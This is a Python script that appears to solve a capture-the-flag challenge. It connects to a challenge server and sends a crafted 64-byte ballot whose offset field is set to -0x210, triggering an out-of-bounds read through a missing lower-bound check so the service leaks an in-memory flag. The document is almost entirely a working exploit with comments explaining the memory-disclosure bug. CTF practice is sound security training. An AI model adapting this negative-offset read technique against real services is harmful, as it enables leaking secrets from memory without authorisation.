#!/usr/bin/env python3
import re
import socket
import struct
import sys


HOST = sys.argv[1] if len(sys.argv) > 1 else "0.cloud.chals.io"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 24907


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while not data.endswith(marker):
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError("connection closed")
        data += chunk
    return bytes(data)


with socket.create_connection((HOST, PORT)) as sock:
    recv_until(sock, b"\n> ")

    # A ballot is 64 bytes: 48 bytes of data followed by an offset and a
    # length.  show 7 applies ballot 6's offset/length to ballot 7's data.
    # The offset has no effective lower-bound check, so UINT64(-0x210)
    # makes the read walk backwards to the in-memory flag.
    payload = (
        b"\x00" * 48
        + struct.pack("<Q", (-0x210) & 0xFFFFFFFFFFFFFFFF)
        + struct.pack("<Q", 0x60)
    )

    sock.sendall(b"set 6 " + payload.hex().encode() + b"\n")
    recv_until(sock, b"\n> ")

    sock.sendall(b"show 7\n")
    leak = recv_until(sock, b"\n> ")[:-3]

    match = re.search(rb"isfcr\{[^}\n]+\}", leak)
    if not match:
        raise SystemExit(f"flag not found in leak: {leak!r}")
    print(match.group().decode())
